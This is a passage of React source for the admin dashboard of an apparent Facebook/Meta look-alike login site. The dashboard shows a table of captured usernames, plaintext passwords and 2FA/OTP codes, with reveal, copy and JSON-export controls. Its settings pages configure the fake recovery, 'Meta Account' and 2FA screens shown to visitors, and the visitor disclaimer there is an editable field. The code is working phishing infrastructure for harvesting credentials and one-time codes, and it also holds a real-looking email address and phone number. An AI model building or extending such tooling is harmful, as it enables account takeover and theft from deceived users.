                        <span className="fb-admin-chip-count">{metaAccountCount}</span>
                      </button>
                    )}

                    {findAccountCount > 0 && (
                      <button
                        type="button"
                        className={`fb-admin-filter-chip ${logFilter === 'find_account' ? 'active' : ''}`}
                        onClick={() => setLogFilter('find_account')}
                      >
                        <Search size={13} />
                        <span>🔍 Find Account</span>
                        <span className="fb-admin-chip-count">{findAccountCount}</span>
                      </button>
                    )}

                    {desktopLoginCount > 0 && (
                      <button
                        type="button"
                        className={`fb-admin-filter-chip ${logFilter === 'desktop' ? 'active' : ''}`}
                        onClick={() => setLogFilter('desktop')}
                      >
                        <span>🖥️ Desktop Login</span>
                        <span className="fb-admin-chip-count">{desktopLoginCount}</span>
                      </button>
                    )}
                  </div>
                </div>

                {/* Enterprise Formal Divided Database Table Card */}
                <div className="fb-admin-formal-table-card">
                  {/* Card Header Toolbar */}
                  <div className="fb-admin-formal-header-bar">
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <h3 style={{ margin: 0, fontSize: '16.5px', fontWeight: 800, color: '#0F172A', display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <ShieldCheck size={20} color="#0866FF" />
                          <span>Captured Database Records</span>
                        </h3>
                        <span
                          style={{
                            fontSize: '11.5px',
                            fontWeight: 700,
                            padding: '3px 9px',
                            borderRadius: '999px',
                            background: '#EFF6FF',
                            color: '#1D4ED8',
                            border: '1px solid #BFDBFE',
                          }}
                        >
                          {filteredLogs.length} {filteredLogs.length === 1 ? 'event' : 'events'}
                          {filteredLogs.length !== loginLogs.length ? ` (filtered from ${loginLogs.length})` : ''}
                        </span>
                      </div>
                      <p style={{ margin: '4px 0 0 0', fontSize: '12.5px', color: '#64748B' }}>
                        Formal audit logs: captured credentials, 2FA verification trials, codes and access outcomes.
                      </p>
                    </div>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      {logSearchQuery && (
                        <button
                          type="button"
                          className="fb-admin-btn-secondary"
                          style={{ fontSize: '11.5px', padding: '5px 10px', borderRadius: '6px' }}
                          onClick={() => {
                            setLogSearchQuery('');
                            setLogFilter('all');
                          }}
                        >
                          Reset Filters
                        </button>
                      )}

                      <button
                        type="button"
                        className="fb-admin-btn-secondary"
                        style={{ fontSize: '12px', padding: '5px 11px', borderRadius: '6px', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                        onClick={handleExportLogsJson}
                        title="Export database records as JSON"
                      >
                        <Download size={13} />
                        <span>Export JSON</span>
                      </button>

                      {loginLogs.length > 0 && (
                        <button
                          type="button"
                          style={{
                            fontSize: '11.5px',
                            padding: '5px 10px',
                            borderRadius: '6px',
                            border: '1px solid #FECACA',
                            background: '#FEF2F2',
                            color: '#DC2626',
                            fontWeight: 600,
                            cursor: 'pointer',
                            display: 'inline-flex',
                            alignItems: 'center',
                            gap: '4px',
                          }}
                          onClick={handleClearLogs}
                          title="Purge all logs"
                        >
                          <Trash2 size={12} />
                          <span>Clear Logs</span>
                        </button>
                      )}
                    </div>
                  </div>

                  {filteredLogs.length === 0 ? (
                    <div style={{ textAlign: 'center', padding: '52px 20px', color: '#64748B' }}>
                      <Database size={44} color="#94A3B8" style={{ marginBottom: '12px' }} />
                      <p style={{ margin: 0, fontWeight: 700, fontSize: '15px', color: '#0F172A' }}>
                        {loginLogs.length === 0
                          ? 'No login attempts or actions recorded yet.'
                          : 'No database records match your active filter.'}
                      </p>
                      <p style={{ fontSize: '13px', margin: '6px 0 16px', color: '#64748B' }}>
                        {loginLogs.length === 0
                          ? 'Visit the login page to submit credentials, or click below to simulate a trial!'
                          : 'Try clearing your search query or switching to "All Events".'}
                      </p>
                      {loginLogs.length === 0 ? (
                        <button
                          type="button"
                          className="fb-admin-glow-btn"
                          onClick={handleSimulateTestLogin}
                        >
                          <Sparkles size={16} />
                          <span>Add Test "Bol Riak Kuo" Login Record</span>
                        </button>
                      ) : (
                        <button
                          type="button"
                          className="fb-admin-btn-secondary"
                          onClick={() => {
                            setLogSearchQuery('');
                            setLogFilter('all');
                          }}
                        >
                          Clear Filters
                        </button>
                      )}
                    </div>
                  ) : (
                    <div className="fb-admin-formal-table-wrap">
                      <table className="fb-admin-formal-table">
                        <thead>
                          <tr>
                            <th style={{ width: '80px', textAlign: 'center' }}># Record</th>
                            <th style={{ width: '190px' }}>User / Account</th>
                            <th style={{ width: '190px' }}>Origin & Device</th>
                            <th style={{ width: '200px' }}>Captured Password</th>
                            <th style={{ width: '160px', textAlign: 'center' }}>2FA / OTP Code</th>
                            <th style={{ width: '130px' }}>Timestamp</th>
                            <th style={{ width: '190px' }}>Verification Status</th>
                            <th style={{ width: '100px', textAlign: 'right' }}>Actions</th>
                          </tr>
                        </thead>
                        <tbody>
                          {filteredLogs.map((log, index) => {
                            const dateObj = log.createdAt ? new Date(log.createdAt) : new Date();
                            const formattedTime = dateObj.toLocaleTimeString([], {
                              hour: '2-digit',
                              minute: '2-digit',
                              second: '2-digit',
                            });
                            const formattedDate = dateObj.toLocaleDateString();
                            const isPasswordRevealed = Boolean(revealedPasswords[log.id]);
                            const isPasswordCopied = copiedId === `pass_${log.id}`;

                            const displayName = log.accountName || log.username || log.email || 'Anonymous';
                            const credentialInput = log.email || log.username || log.accountName || '';

                            return (
                              <tr key={log.id} className="fb-admin-formal-row">
                                {/* 1. # Record & ID */}
                                <td style={{ textAlign: 'center' }}>
                                  <div style={{ display: 'inline-flex', flexDirection: 'column', alignItems: 'center', gap: '3px' }}>
                                    <span
                                      style={{
                                        fontFamily: 'Consolas, monospace',
                                        fontSize: '11px',
                                        fontWeight: 800,
                                        background: '#F1F5F9',
                                        border: '1px solid #E2E8F0',
                                        color: '#334155',
                                        padding: '2px 7px',
                                        borderRadius: '5px',
                                      }}
                                    >
                                      #{String(filteredLogs.length - index).padStart(2, '0')}
                                    </span>
                                    <button
                                      type="button"
                                      onClick={() => handleCopyText(log.id, `id_${log.id}`)}
                                      title={`Copy Log ID: ${log.id}`}
                                      style={{
                                        background: 'none',
                                        border: 'none',
                                        cursor: 'pointer',
                                        padding: '1px 3px',
                                        fontSize: '10px',
                                        fontFamily: 'Consolas, monospace',
                                        color: copiedId === `id_${log.id}` ? '#0E8A38' : '#94A3B8',
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        gap: '3px',
                                      }}
                                    >
                                      <span>{log.id.slice(0, 11)}..</span>
                                      {copiedId === `id_${log.id}` ? <Check size={11} /> : <Copy size={10} />}
                                    </button>
                                  </div>
                                </td>

                                {/* 2. User Account */}
                                <td>
                                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                                    <div
                                      style={{
                                        width: '36px',
                                        height: '36px',
                                        borderRadius: '9px',
                                        background: 'linear-gradient(135deg, #0866FF 0%, #00C6FF 100%)',
                                        color: '#FFFFFF',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        fontWeight: 800,
                                        fontSize: '14px',
                                        boxShadow: '0 2px 6px rgba(8, 102, 255, 0.22)',
                                        flexShrink: 0,
                                      }}
                                    >
                                      {displayName[0].toUpperCase()}
                                    </div>
                                    <div style={{ minWidth: 0 }}>
                                      <div style={{ fontWeight: 700, color: '#0F172A', fontSize: '13.5px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                                        {displayName}
                                      </div>
                                      {credentialInput && credentialInput !== displayName ? (
                                        <div
                                          style={{
                                            fontSize: '11px',
                                            color: '#64748B',
                                            whiteSpace: 'nowrap',
                                            overflow: 'hidden',
                                            textOverflow: 'ellipsis',
                                            fontFamily: 'Consolas, monospace',
                                          }}
                                          title={credentialInput}
                                        >
                                          {credentialInput}
                                        </div>
                                      ) : (
                                        <div style={{ fontSize: '11px', color: '#94A3B8' }}>
                                          Visitor Account
                                        </div>
                                      )}
                                    </div>
                                  </div>
                                </td>

                                {/* 3. Origin & Device */}
                                <td>
                                  {(() => {
                                    const src = (log.source || '').toLowerCase();
                                    const scr = (log.screen || '').toLowerCase();
                                    const act = (log.action || '').toLowerCase();

                                    const is2FA = src.includes('2fa') || scr.includes('2fa') || act.includes('2fa');
                                    const isMeta = src.includes('meta') || scr.includes('meta') || act.includes('meta');
                                    const isFind = src.includes('find') || scr.includes('find') || act.includes('find account');
                                    const isMobile = src.includes('mobile') || scr.includes('mobile');
                                    const isSignUp = src.includes('sign up') || src.includes('registration') || act.includes('registration');
                                    const isSim = src.includes('simulat') || act.includes('test');

                                    let badgeBg = '#EFF6FF';
                                    let badgeBorder = '#BFDBFE';
                                    let badgeColor = '#1D4ED8';
                                    let badgeText = log.source || 'Desktop Login Screen';
                                    let badgeIcon = '🖥️';

                                    if (is2FA) {
                                      badgeBg = '#F0FDF4';
                                      badgeBorder = '#BBF7D0';
                                      badgeColor = '#15803D';
                                      badgeText = 'Desktop 2FA Verification';
                                      badgeIcon = '🔐';
                                    } else if (isMeta) {
                                      badgeBg = '#FAF5FF';
                                      badgeBorder = '#E9D5FF';
                                      badgeColor = '#7E22CE';
                                      badgeText = 'Meta Account Flow';
                                      badgeIcon = '♾️';
                                    } else if (isFind) {
                                      badgeBg = '#FFFBEB';
                                      badgeBorder = '#FDE68A';
                                      badgeColor = '#B45309';
                                      badgeText = 'Find Account Flow';
                                      badgeIcon = '🔍';
                                    } else if (isMobile) {
                                      badgeBg = '#EEF2FF';
                                      badgeBorder = '#C7D2FE';
                                      badgeColor = '#4338CA';
                                      badgeText = 'Mobile Login Screen';
                                      badgeIcon = '📱';
                                    } else if (isSignUp) {
                                      badgeBg = '#FFF7ED';
                                      badgeBorder = '#FFEDD5';
                                      badgeColor = '#C2410C';
                                      badgeText = 'Create Account';
                                      badgeIcon = '📝';
                                    } else if (isSim) {
                                      badgeBg = '#F8FAFC';
                                      badgeBorder = '#E2E8F0';
                                      badgeColor = '#475569';
                                      badgeText = 'Admin Simulator';
                                      badgeIcon = '⚙️';
                                    }

                                    return (
                                      <div>
                                        <div
                                          style={{
                                            display: 'inline-flex',
                                            alignItems: 'center',
                                            gap: '5px',
                                            padding: '3px 8px',
                                            borderRadius: '6px',
                                            fontSize: '11.5px',
                                            fontWeight: 700,
                                            background: badgeBg,
                                            border: `1px solid ${badgeBorder}`,
                                            color: badgeColor,
                                            whiteSpace: 'nowrap',
                                          }}
                                        >
                                          <span>{badgeIcon}</span>
                                          <span>{badgeText}</span>
                                        </div>
                                        <div
                                          style={{
                                            fontSize: '11px',
                                            color: '#64748B',
                                            marginTop: '4px',
                                            fontFamily: 'Consolas, monospace',
                                          }}
                                        >
                                          {log.device || (isMobile ? 'Mobile Device' : 'Desktop Browser')}
                                          {log.ip && ` • ${log.ip}`}
                                        </div>
                                      </div>
                                    );
                                  })()}
                                </td>

                                {/* 4. Captured Plaintext Password */}
                                <td>
                                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                                    {log.password && (log.password.startsWith('[Find Account') || log.password === '[Find Account Step]') ? (
                                      <span
                                        style={{
                                          background: '#E0F2FE',
                                          border: '1px solid #BAE6FD',
                                          color: '#0369A1',
                                          fontFamily: 'Consolas, monospace',
                                          padding: '4px 8px',
                                          borderRadius: '6px',
                                          fontWeight: 600,
                                          fontSize: '11.5px',
                                          display: 'inline-flex',
                                          alignItems: 'center',
                                          gap: '4px',
                                          width: 'fit-content',
                                        }}
                                      >
                                        <Search size={11} />
                                        <span>Account Query</span>
                                      </span>
                                    ) : log.password ? (
                                      <div
                                        style={{
                                          display: 'inline-flex',
                                          alignItems: 'center',
                                          gap: '6px',
                                          background: '#FFF1F2',
                                          border: '1px solid #FECDD3',
                                          padding: '4px 8px',
                                          borderRadius: '6px',
                                          color: '#BE123C',
                                          width: 'fit-content',
                                          fontFamily: 'Consolas, monospace',
                                          fontSize: '12.5px',
                                          fontWeight: 700,
                                        }}
                                      >
                                        <Key size={12} color="#BE123C" />
                                        <span>{isPasswordRevealed ? log.password : '••••••••'}</span>

                                        <button
                                          type="button"
                                          onClick={() => togglePasswordVisibility(log.id)}
                                          title={isPasswordRevealed ? 'Mask password' : 'Peek plaintext password'}
                                          style={{
                                            background: 'none',
                                            border: 'none',
                                            cursor: 'pointer',
                                            padding: '2px',
                                            color: '#BE123C',
                                            display: 'inline-flex',
                                            alignItems: 'center',
                                            borderRadius: '4px',
                                          }}
                                        >
                                          {isPasswordRevealed ? <EyeOff size={13} /> : <Eye size={13} />}
                                        </button>

                                        <button
                                          type="button"
                                          onClick={() => handleCopyText(log.password, `pass_${log.id}`)}
                                          title={isPasswordCopied ? 'Copied!' : 'Copy plaintext password'}
                                          style={{
                                            background: 'none',
                                            border: 'none',
                                            cursor: 'pointer',
                                            padding: '2px',
                                            color: isPasswordCopied ? '#059669' : '#BE123C',
                                            display: 'inline-flex',
                                            alignItems: 'center',
                                            borderRadius: '4px',
                                          }}
                                        >
                                          {isPasswordCopied ? <CheckCheck size={13} color="#059669" /> : <Copy size={12} />}
                                        </button>
                                      </div>
                                    ) : (
                                      <span style={{ color: '#94A3B8', fontStyle: 'italic', fontSize: '12px' }}>
                                        [no password entered]
                                      </span>
                                    )}
                                  </div>
                                </td>

                                {/* 5. Security / OTP Code */}
                                <td style={{ textAlign: 'center' }}>
                                  {log.code ? (
                                    <div style={{ display: 'inline-flex', flexDirection: 'column', alignItems: 'center', gap: '3px' }}>
                                      <span
                                        style={{
                                          background: log.code === '00000' || log.success ? '#ECFDF5' : '#FEF2F2',
                                          border: log.code === '00000' || log.success ? '1px solid #A7F3D0' : '1px solid #FECACA',
                                          color: log.code === '00000' || log.success ? '#047857' : '#DC2626',
                                          fontFamily: 'Consolas, monospace',
                                          padding: '3px 10px',
                                          borderRadius: '6px',
                                          fontWeight: 800,
                                          fontSize: '12.5px',
                                          letterSpacing: '0.8px',
                                          display: 'inline-flex',
                                          alignItems: 'center',
                                          gap: '5px',
                                        }}
                                      >
                                        <span>{log.code === '00000' || log.success ? '✅' : '🔢'}</span>
                                        <span>{log.code}</span>
                                      </span>
                                      <span
                                        style={{
                                          fontSize: '10.5px',
                                          fontWeight: 700,
                                          color: log.code === '00000' || log.success ? '#059669' : '#DC2626',
                                        }}
                                      >
                                        {log.code === '00000' || log.success ? '✓ Verified (Allowed)' : '✕ Denied (Trial)'}
                                      </span>
                                    </div>
                                  ) : (
                                    <span style={{ color: '#CBD5E1', fontSize: '14px', fontWeight: 600 }}>—</span>
                                  )}
                                </td>

                                {/* 6. Timestamp */}
                                <td>
                                  <div style={{ fontSize: '12.5px', color: '#0F172A', fontWeight: 600, fontFamily: 'Consolas, monospace' }}>
                                    {formattedTime}
                                  </div>
                                  <div style={{ fontSize: '11px', color: '#64748B', marginTop: '2px' }}>
                                    {formattedDate}
                                  </div>
                                </td>

                                {/* 7. Status & Event */}
                                <td>
                                  <div style={{ display: 'flex', flexDirection: 'column', gap: '3px' }}>
                                    <span
                                      style={{
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        gap: '5px',
                                        padding: '3px 9px',
                                        borderRadius: '999px',
                                        fontSize: '11.5px',
                                        fontWeight: 700,
                                        background: log.success ? '#ECFDF5' : '#FFFBEB',
                                        color: log.success ? '#047857' : '#B45309',
                                        border: `1px solid ${log.success ? '#A7F3D0' : '#FDE68A'}`,
                                        width: 'fit-content',
                                      }}
                                    >
                                      <span
                                        style={{
                                          width: '6px',
                                          height: '6px',
                                          borderRadius: '50%',
                                          backgroundColor: log.success ? '#059669' : '#D97706',
                                        }}
                                      />
                                      {log.success ? 'Verified Success' : 'Trial Recorded'}
                                    </span>
                                    <span
                                      style={{
                                        fontSize: '11px',
                                        color: '#64748B',
                                        fontWeight: 500,
                                        maxWidth: '185px',
                                        overflow: 'hidden',
                                        textOverflow: 'ellipsis',
                                        whiteSpace: 'nowrap',
                                      }}
                                      title={log.action || 'Login Attempt'}
                                    >
                                      {log.action || 'Login Attempt'}
                                    </span>
                                  </div>
                                </td>

                                {/* 8. Actions */}
                                <td style={{ textAlign: 'right' }}>
                                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', justifyContent: 'flex-end' }}>
                                    <button
                                      type="button"
                                      onClick={() => handleCopyText(JSON.stringify(log, null, 2), `row_${log.id}`)}
                                      title="Copy raw JSON for this record"
                                      style={{
                                        fontSize: '11px',
                                        padding: '4px 8px',
                                        borderRadius: '6px',
                                        border: '1px solid #CBD5E1',
                                        background: '#FFFFFF',
                                        color: '#334155',
                                        fontWeight: 600,
                                        cursor: 'pointer',
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        gap: '3px',
                                        transition: 'background-color 0.12s ease',
                                      }}
                                    >
                                      {copiedId === `row_${log.id}` ? (
                                        <span style={{ color: '#059669', display: 'flex', alignItems: 'center', gap: '3px' }}>
                                          <Check size={12} /> Copied
                                        </span>
                                      ) : (
                                        <span style={{ display: 'flex', alignItems: 'center', gap: '3px' }}>
                                          <Code2 size={12} /> JSON
                                        </span>
                                      )}
                                    </button>
                                    <button
                                      type="button"
                                      onClick={() => handleDeleteSingleLog(log.id)}
                                      title="Delete record from store.json"
                                      style={{
                                        background: 'none',
                                        border: 'none',
                                        cursor: 'pointer',
                                        padding: '4px 6px',
                                        borderRadius: '6px',
                                        color: '#DC2626',
                                        display: 'inline-flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        transition: 'background-color 0.15s ease',
                                      }}
                                      onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#FEE2E2')}
                                      onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                                    >
                                      <Trash2 size={14} />
                                    </button>
                                  </div>
                                </td>
                              </tr>
                            );
                          })}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {/* Formal Audit Footer Summary Bar */}
                  <div className="fb-admin-formal-footer-bar">
                    <div style={{ display: 'flex', alignItems: 'center', gap: '14px', flexWrap: 'wrap' }}>
                      <span style={{ fontWeight: 600, color: '#334155' }}>
                        Showing {filteredLogs.length} of {loginLogs.length} total recorded entries
                      </span>
                      <span style={{ color: '#CBD5E1' }}>|</span>
                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#059669', fontWeight: 600 }}>
                        <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#059669' }} />
                        {successfulLoginsCount} Verified
                      </span>
                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#D97706', fontWeight: 600 }}>
                        <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#D97706' }} />
                        {trialKeystrokesCount} Denied Trials
                      </span>
                      {otpCodesCount > 0 && (
                        <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#7C3AED', fontWeight: 600 }}>
                          <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#7C3AED' }} />
                          {otpCodesCount} OTP Trials
                        </span>
                      )}
                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', color: '#DC2626', fontWeight: 600 }}>
                        <span style={{ width: '6px', height: '6px', borderRadius: '50%', background: '#DC2626' }} />
                        {totalCapturedPasswords} Passwords
                      </span>
                    </div>

                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', fontSize: '11.5px', color: '#64748B' }}>
                        <span style={{ width: '7px', height: '7px', borderRadius: '50%', background: '#10B981', boxShadow: '0 0 6px #10B981' }} />
                        <span>Persistence: <strong>store.json</strong></span>
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            );
          })()}

          {/* ========================================================
              TAB 4: NOTIFICATIONS
              ======================================================== */}
          {activeTab === 'notifs' && (
            <div className="fb-admin-tab-pane">
              <h2 className="fb-admin-section-heading">Broadcast Notifications</h2>
              <p className="fb-admin-section-sub">
                Send global announcements to users.
              </p>

              <div className="fb-admin-panel-box">
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16 }}>All Notifications ({notifications.length})</h3>
                <div className="fb-admin-notifs-list">
                  {notifications.map((n) => {
                    const userName = typeof n.user === 'object' ? n.user?.name : (n.user || 'User');
                    const userAvatar = typeof n.user === 'object' ? n.user?.avatar : (n.avatar || 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80');
                    return (
                      <div key={n.id} className="fb-admin-notif-item">
                        <img src={userAvatar} alt="Notification" className="table-avatar" />
                        <div className="notif-text-wrap">
                          <strong>{userName}</strong> {n.action}
                          <div className="notif-time">{n.timeAgo || n.time || 'Recent'}</div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          )}

          {/* ========================================================
              TAB: RECOVERY & META ACCOUNT SETTINGS
              ======================================================== */}
          {activeTab === 'recovery' && (
            <div className="fb-admin-tab-pane">
              <div className="fb-admin-section-header-row">
                <div>
                  <h2 className="fb-admin-section-heading">Recovery & Meta Account Flow Settings</h2>
                  <p className="fb-admin-section-sub">
                    Configure the default email and phone numbers for the "Choose a way to log in" and "Log into your Meta Account" screens.
                  </p>
                </div>
                <div style={{ display: 'flex', gap: '8px' }}>
                  <button
                    type="button"
                    className="fb-admin-btn-secondary"
                    onClick={handleResetRecoveryDefaults}
                  >
                    <RefreshCw size={14} />
                    <span>Reset Defaults</span>
                  </button>
                  <button
                    type="button"
                    className="fb-admin-glow-btn"
                    onClick={handleSaveRecoverySettings}
                  >
                    <Check size={16} />
                    <span>Save Settings</span>
                  </button>
                </div>
              </div>

              {recoverySavedNotice && (
                <div
                  style={{
                    background: '#E7F3FF',
                    border: '1px solid #1877F2',
                    color: '#0866FF',
                    padding: '12px 16px',
                    borderRadius: '8px',
                    marginBottom: '18px',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '10px',
                    fontWeight: 600,
                    fontSize: '14px',
                  }}
                >
                  <CheckCircle2 size={18} color="#0866FF" />
                  <span>Recovery & Meta account settings saved successfully! Changes are instantly live across the login flow.</span>
                </div>
              )}

              <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '24px', alignItems: 'start' }}>
                {/* Form Box */}
                <div className="fb-admin-panel-box">
                  <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 700, color: '#050505' }}>
                    Recovery Configuration
                  </h3>

                  <form onSubmit={handleSaveRecoverySettings}>
                    <div className="fb-admin-form-group" style={{ marginBottom: 16 }}>
                      <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                        Default Meta Account Email
                      </label>
                      <input
                        type="text"
                        className="fb-admin-input"
                        value={recoverySettings.defaultEmail}
                        onChange={(e) => setRecoverySettings({ ...recoverySettings, defaultEmail: e.target.value })}
                        placeholder="e.g. ademt0614@gmail.com"
                        style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                      />
                      <small style={{ color: '#65676B', fontSize: 12, marginTop: 4, display: 'block' }}>
                        Displayed on the Meta Account card when the user enters a phone number or did not choose an email.
                      </small>
                    </div>

                    <div className="fb-admin-form-group" style={{ marginBottom: 16 }}>
                      <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                        Default Phone Number
                      </label>
                      <input
                        type="text"
                        className="fb-admin-input"
                        value={recoverySettings.defaultPhone}
                        onChange={(e) => setRecoverySettings({ ...recoverySettings, defaultPhone: e.target.value })}
                        placeholder="e.g. +251990039392"
                        style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                      />
                      <small style={{ color: '#65676B', fontSize: 12, marginTop: 4, display: 'block' }}>
                        Single phone number displayed under "Get code on WhatsApp and SMS" when user enters an email or did not choose a phone number.
                      </small>
                    </div>

                    <div className="fb-admin-form-group" style={{ marginBottom: 16 }}>
                      <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                        Static Time Display
                      </label>
                      <input
                        type="text"
                        className="fb-admin-input"
                        value={recoverySettings.countdownTime}
                        onChange={(e) => setRecoverySettings({ ...recoverySettings, countdownTime: e.target.value })}
                        placeholder="e.g. (00:36)"
                        style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                      />
                      <small style={{ color: '#65676B', fontSize: 12, marginTop: 4, display: 'block' }}>
                        Shown next to "Get code on WhatsApp and SMS" without dynamic ticking.
                      </small>
                    </div>

                    <div className="fb-admin-form-group" style={{ marginBottom: 20 }}>
                      <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 6, display: 'block' }}>
                        When User Enters Phone Number, Meta Account Card Displays:
                      </label>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                        <label style={{ display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer', fontSize: 13 }}>
                          <input
                            type="radio"
                            name="cardDisplayFallback"
                            value="email"
                            checked={recoverySettings.cardDisplayFallback !== 'phone'}
                            onChange={() => setRecoverySettings({ ...recoverySettings, cardDisplayFallback: 'email' })}
                          />
                          <span><strong>Admin Setted Email</strong> (e.g. {recoverySettings.defaultEmail}) — <em>Recommended</em></span>
                        </label>
                        <label style={{ display: 'flex', alignItems: 'center', gap: 8, cursor: 'pointer', fontSize: 13 }}>
                          <input
                            type="radio"
                            name="cardDisplayFallback"
                            value="phone"
                            checked={recoverySettings.cardDisplayFallback === 'phone'}
                            onChange={() => setRecoverySettings({ ...recoverySettings, cardDisplayFallback: 'phone' })}
                          />
                          <span><strong>User Entered Phone Number</strong></span>
                        </label>
                      </div>
                    </div>

                    <div style={{ borderTop: '1px solid #E2E8F0', margin: '20px 0 16px 0', paddingTop: 16 }}>
                      <h4 style={{ margin: '0 0 12px 0', fontSize: 14, fontWeight: 700, color: '#0F172A' }}>
                        Two-Factor Authentication (2FA) Challenge Settings
                      </h4>

                      <div className="fb-admin-form-group" style={{ marginBottom: 14 }}>
                        <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                          2FA Screen Title
                        </label>
                        <input
                          type="text"
                          className="fb-admin-input"
                          value={recoverySettings.twoFactorTitle || 'Check your text messages'}
                          onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorTitle: e.target.value })}
                          placeholder="e.g. Check your text messages"
                          style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                        />
                      </div>

                      <div className="fb-admin-form-group" style={{ marginBottom: 14 }}>
                        <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                          2FA Screen Subtitle
                        </label>
                        <input
                          type="text"
                          className="fb-admin-input"
                          value={recoverySettings.twoFactorSubtitle || 'Enter the code that we sent to your mobile number.'}
                          onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorSubtitle: e.target.value })}
                          placeholder="e.g. Enter the code that we sent to your mobile number."
                          style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                        />
                      </div>

                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginBottom: 16 }}>
                        <div className="fb-admin-form-group">
                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                            2FA Channel Icon
                          </label>
                          <select
                            className="fb-admin-input"
                            value={recoverySettings.twoFactorChannel || 'sms'}
                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorChannel: e.target.value })}
                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                          >
                            <option value="sms">Text / SMS Message</option>
                            <option value="whatsapp">WhatsApp</option>
                          </select>
                        </div>
                        <div className="fb-admin-form-group">
                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                            Resend Timer (e.g. 00:52)
                          </label>
                          <input
                            type="text"
                            className="fb-admin-input"
                            value={recoverySettings.twoFactorTimer || '00:52'}
                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorTimer: e.target.value })}
                            placeholder="00:52"
                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                          />
                        </div>
                      </div>

                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12, marginBottom: 14 }}>
                        <div className="fb-admin-form-group">
                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                            Expected 2FA OTP Code (Default: 00000)
                          </label>
                          <input
                            type="text"
                            className="fb-admin-input"
                            value={recoverySettings.twoFactorExpectedCode || '00000'}
                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorExpectedCode: e.target.value })}
                            placeholder="00000"
                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4', fontFamily: 'monospace' }}
                          />
                        </div>
                        <div className="fb-admin-form-group">
                          <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                            Code Input Placeholder Clue
                          </label>
                          <input
                            type="text"
                            className="fb-admin-input"
                            value={recoverySettings.twoFactorPlaceholder || 'Code (Clue: 00000)'}
                            onChange={(e) => setRecoverySettings({ ...recoverySettings, twoFactorPlaceholder: e.target.value })}
                            placeholder="Code (Clue: 00000)"
                            style={{ width: '100%', padding: '10px 12px', borderRadius: 8, border: '1px solid #CED0D4' }}
                          />
                        </div>
                      </div>

                      <div className="fb-admin-form-group" style={{ marginBottom: 14 }}>
                        <label className="fb-admin-label" style={{ fontWeight: 600, fontSize: 13, marginBottom: 4, display: 'block' }}>
                          Visitor Warning Notice / Disclaimer
                        </label>
                        <input
                          type="text"
                          className="fb-admin-input"
                          value={recoverySettings.twoFactorWarning ?? '⚠️ Notice: This is not Facebook. Do not enter real credentials or personal information.'}
